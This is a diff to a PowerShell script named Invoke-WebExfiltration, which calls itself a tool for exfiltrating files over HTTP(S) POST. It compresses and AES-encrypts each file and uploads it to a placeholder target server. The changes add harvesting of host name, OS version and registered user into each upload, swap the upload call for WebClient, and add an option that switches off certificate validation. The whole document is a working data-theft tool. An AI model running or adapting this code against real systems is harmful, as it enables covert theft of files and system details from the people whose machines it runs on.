@@ -1,8 +1,9 @@
-
-Function Invoke-WebExfiltration {
-     <#
+Function Invoke-WebExfiltration
+{
+    <#
         .SYNOPSIS
-        PowerShell function to exfiltrate data via HTTP(s) POST request (with file gzip compression and AES-256 encryption)
+        PowerShell function to exfiltrate data via HTTP(s) POST request
+        (with file gzip compression and AES-256 encryption)
         Author: Philipp Rieth
 
         .LINK
@@ -54,42 +55,35 @@ Function Invoke-WebExfiltration {
                 Mandatory = $false
         )]
         [string]$Target = 'TARGET_PLACEHOLDER',
-        [string]$Password,
+        [String]$Password,
         [switch]$Insecure
     )
 
     Begin {
         Write-Host "[~] Target server: '$target'"
 
-        if ((-Not $Password) -And (-Not $unencrypted)) {
-            $Password = Read-Host -MaskInput '[*] Password'
+        if (-Not$Password)
+        {
+            # $Password = Read-Host -MaskInput '[*] Password'
+            $securedValue = Read-Host -AsSecureString '[*] Password'
+            $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($securedValue)
+            $Password = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
 
-            if (-Not $Password){
-                Write-Host "[!] You provided an empty password! Files and file names will not be encrypted."
-                $yes_no = Read-Host "[!] Do you wish to continue? (y/N)"
-
-                if ($yes_no -like "y*"){
-                    $unencrypted = $true
-                    Write-Host "[!] Files and file names will not be encrypted"
-                } else {
-                    Write-Host "[X] Exit"
-                    Break
-                }
+            if (-Not $Password)
+            {
+                Write-Host "[!] You provided an empty password! This won't work"
             }
-
-        }elseif ($Password -and $unencrypted){
-            Write-Host "[X] You can't specifiy '-Password' and '-Unencrypted' at the same time"
-            break
         }
 
         Write-Debug "Plaintext password: '$Password'"
     }
 
     Process {
-         if ((Get-Item $file) -is [System.IO.DirectoryInfo]){
-             Write-Verbose "'$file' is a directory. Skipping..."
-             return
-         }
+        if ((Get-Item $file) -is [System.IO.DirectoryInfo])
+        {
+            Write-Verbose "'$file' is a directory. Skipping..."
+            return
+        }
 
         Write-Host "[+] Exfiltrating file '$file'"
 
@@ -99,8 +93,8 @@ Function Invoke-WebExfiltration {
 
         Write-Verbose "AES-256 encrypting '$file_name' (Block: 128 Bit)"
 
-         # AES encrypt
-         # Source: https://www.powershellgallery.com/packages/DRTools/4.0.3.4/Content/Functions%5CInvoke-AESEncryption.ps1
+        # AES encrypt
+        # Source: https://www.powershellgallery.com/packages/DRTools/4.0.3.4/Content/Functions%5CInvoke-AESEncryption.ps1
         $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
         $aesManaged = New-Object System.Security.Cryptography.AesManaged
         $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
@@ -116,17 +110,26 @@ Function Invoke-WebExfiltration {
         $file_bin_encrypted = $aesManaged.IV + $file_bin_encrypted
 
         # Write-Debug "Key SHA256 Dec: $($aesManaged.Key)"
-        Write-Debug "Key SHA256 Hex: $([System.BitConverter]::ToString($aesManaged.Key).Replace('-', ''))"
-        Write-Debug "Key length:     $($aesManaged.KeySize) Bit ($($aesManaged.KeySize/8) Byte)"
+        Write-Debug "Key SHA256 Hex: $([System.BitConverter]::ToString($aesManaged.Key).Replace('-', '') )"
+        Write-Debug "Key length:     $( $aesManaged.KeySize ) Bit ($( $aesManaged.KeySize/8 ) Byte)"
         # Write-Debug "AES IV Dec:     $($aesManaged.IV)"
-        Write-Debug "AES IV Hex:     $([System.BitConverter]::ToString($aesManaged.IV).Replace('-', ''))"
-        Write-Debug "AES IV length:  $([System.BitConverter]::ToString($aesManaged.IV).Replace('-', '').length*4) Bit ($([System.BitConverter]::ToString($aesManaged.IV).Replace('-', '').length*4/8) Byte)"
-        Write-Debug "AES-256 Bin: $([System.BitConverter]::ToString($file_bin_encrypted).Replace('-', ''))"
+        Write-Debug "AES IV Hex:     $([System.BitConverter]::ToString($aesManaged.IV).Replace('-', '') )"
+        Write-Debug "AES IV length:  $( [System.BitConverter]::ToString($aesManaged.IV).Replace('-', '').length*4 ) Bit ($( [System.BitConverter]::ToString($aesManaged.IV).Replace('-', '').length*4/8 ) Byte)"
+        Write-Debug "AES-256 Bin: $([System.BitConverter]::ToString($file_bin_encrypted).Replace('-', '') )"
 
+        # Encrypt file name
         $file_name_utf8 = [System.Text.Encoding]::UTF8.GetBytes($file)
         $file_name_encrypted = $encryptor.TransformFinalBlock($file_name_utf8, 0, $file_name_utf8.Length)
         $file_name_encrypted = $aesManaged.IV + $file_name_encrypted
-        Write-Debug "AES-256 file name: $([System.BitConverter]::ToString($file_name_encrypted).Replace('-', ''))"
+        Write-Debug "AES-256 file name: $([System.BitConverter]::ToString($file_name_encrypted).Replace('-', '') )"
+
+        # Encrypt systeminfo
+        # (Get-WmiObject Win32_OperatingSystem) | Format-List *
+        $si = Get-CimInstance Win32_OperatingSystem
+        $sysinfo = [System.Text.Encoding]::UTF8.GetBytes("$( $si.csname ) $( $si.caption ) $( $si.version ) $( $si.RegisteredUser )")
+        $sysinfo_encrypted = $encryptor.TransformFinalBlock($sysinfo, 0, $sysinfo.Length)
+        $sysinfo_encrypted = $aesManaged.IV + $sysinfo_encrypted
+        Write-Debug "AES-256 sysinfo: $([System.BitConverter]::ToString($sysinfo_encrypted).Replace('-', '') )"
 
         $aesManaged.Dispose()
         Write-Verbose "AES-256 encrypted '$file_name'"
@@ -144,79 +147,105 @@ Function Invoke-WebExfiltration {
         # convert to base64 string
         $b64_bin_gzip = [Convert]::ToBase64String($ms.ToArray())
         $b64_filename = [Convert]::ToBase64String($file_name_encrypted)
+        $b64_sysinfo = [Convert]::ToBase64String($sysinfo_encrypted)
 
         Write-Debug "Base64 file name: $b64_filename"
+        Write-Debug "Base64 sysinfo: $b64_sysinfo"
         Write-Debug "Base64 bin: $b64_bin_gzip"
         $ms.Close()
 
         $body = @{
-            "fn" = "$b64_filename"
-            "ct" = "$b64_bin_gzip"
+            "si" = $b64_sysinfo
+            "fn" = $b64_filename
+            "ct" = $b64_bin_gzip
         }
 
         Write-Verbose "Uploading file '$file_name'"
         $uri = [uri]::EscapeUriString($target)
         # $rest_timeout = 10
 
-        try {
-            if ($Insecure){
+        try
+        {
+            if ($Insecure)
+            {
                 Write-Verbose "Ignoring certificate check"
-                $response = Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json" -SkipCertificateCheck
-            } else {
-                $response = Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json"
+                [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
             }
 
-        }catch [System.Net.WebException] {
-            if($_.Exception.Status -eq 'Timeout'){
+            $wc = new-object System.Net.WebClient
+            $wc.Headers.Add('Content-Type', 'application/json')
+            $response = $wc.UploadString($uri, "POST", ($body|ConvertTo-Json))
+
+        }
+        catch [System.Net.WebException]
+        {
+            if ($_.Exception.Status -eq 'Timeout')
+            {
                 Write-Host "[X] Error: Send data to server but got timeout after $rest_timeout sec. "
                 break
-            }else {
-                Write-Host "[X] Error: An unexcepted System.Net.WebExpection occured. $($_.Exception.GetType().FullName)"
+
+                # ProtocolError means HTTP return code != 200 or 2*
+                # Do some HTTP return code handling
+            }
+            elseif($_.Exception.Status -eq 'ProtocolError')
+            {
+                Write-Host "[X] Error: Expected HTTP return code '200' but got '$( $_.Exception.Response.StatusCode ) (HTTP $( [int]$_.Exception.Response.StatusCode ))' instead"
+            }
+            else
+            {
+                Write-Host "[X] Error: An unexcepted exception occured: $( $_.Exception.GetType().FullName )"
+                Write-Host "[X] Error: Exception status: '$( $_.Exception.Status )'"
             }
         }
-        catch  [System.Net.Http.HttpRequestException] {
-             $response_code = $_.Exception.Response.StatusCode
-             $message = $_.Exception.Message
+        catch  [System.Net.Http.HttpRequestException]
+        {
+            $message = $_.Exception.Message
 
-            if ($message -like "No connection could be made*"){
-                Write-Host "[X] Error: Could not connect to the server. Got this error: '$($_.Exception.Message)'"
+            Write-Host "[X] Error: got exception: '$( $_.Exception.Message )'"
+
+            if ($message -like "No connection could be made*")
+            {
+                Write-Host "[X] Error: Could not connect to the server. "
+                break
             }
-            elseif (-not $response_code){
+            elseif (-not$message)
+            {
                 Write-Host "[X] Error: Server answered but I got no HTTP(S) return code"
                 Write-Host "[X] Error: This could be due to certificate error like mismatch or self signed"
                 Write-Host "[X] Error: Try again with parameter '-Insecure'"
-            }else {
-                Write-Host "[X] Error: Got unexpected response code '$response_code' from server"
-                Write-Host "[X] Error: Message from server: '$message'"
+                Break
             }
-             Break
+            else
+            {
+                throw $_.Exception
+            }
         }
-        #catch {
-        #    Write-Host "[X] Error: An unknown error occured! $($_.Exception.GetType().FullName)"
-        #    Write-Host "[X] Error: StatusCode:  $($_.Exception.Response.StatusCode.value__)"
-        #    Write-Host "[X] Error: StatusDescription:  $($_.Exception.Response.StatusDescription)"
-        #    Write-Host "[X] Error: I've no idea what's going on :("
-        #    break
-        #}
-
-         # Some return code handling
-         if ($response.StatusCode -ne '200') {
-                Write-Host "[X] Error: Got unexpected response code '$($response.StatusCode)' from server"
-                Write-Host "[X] Error: Message from server: '$($response.Content)'"
+        catch
+        {
+            Write-Host "[X] Error: Got an unknown, unexcpected exception: '$( $_.Exception.GetType().FullName )'"
+            Write-Host "[X] Error: InnerException: '$( $_.Exception.InnerException.Response )'"
+            Write-Host "[X] Error: StatusCode:  '$( $_.Exception.Response.StatusCode.value__ )'"
+            Write-Host "[X] Error: StatusDescription:  '$( $_.Exception.Response.StatusDescription )'"
+            Write-Host "[X] Error: I've no idea what's going on :("
+            break
         }
 
-         Write-Verbose "Uploaded '$file_name'"
-         Write-Verbose "Server returned message: '$($response.Content)'"
-
-         if ($response.Content -ne 'Thanks!'){
-             Write-Host "[X] Error: Host returned '$($response.Content)'"
-             Write-Host "[X] Upload was not successfull. Something is wrong."
-             break
-         }
+        # Some return code handling
+        if ($response.ToString() -ne 'Thanks!')
+        {
+            Write-Host "[X] Error: Host returned '$($response.ToString() )'"
+            Write-Host "[X] Upload was not successfull. Something is wrong."
+            break
+        }
+        else
+        {
+            Write-Verbose "Uploaded '$file_name'"
+            Write-Verbose "Server returned message: '$($response.ToString() )'"
+        }
     }
 
-     End {
-         # Write-Host "[~]"
-         Write-Host "[~] All done!"
-     }
+    End {
+        # Write-Host "[~]"
+        Write-Host "[~] All done!"
+    }
 }
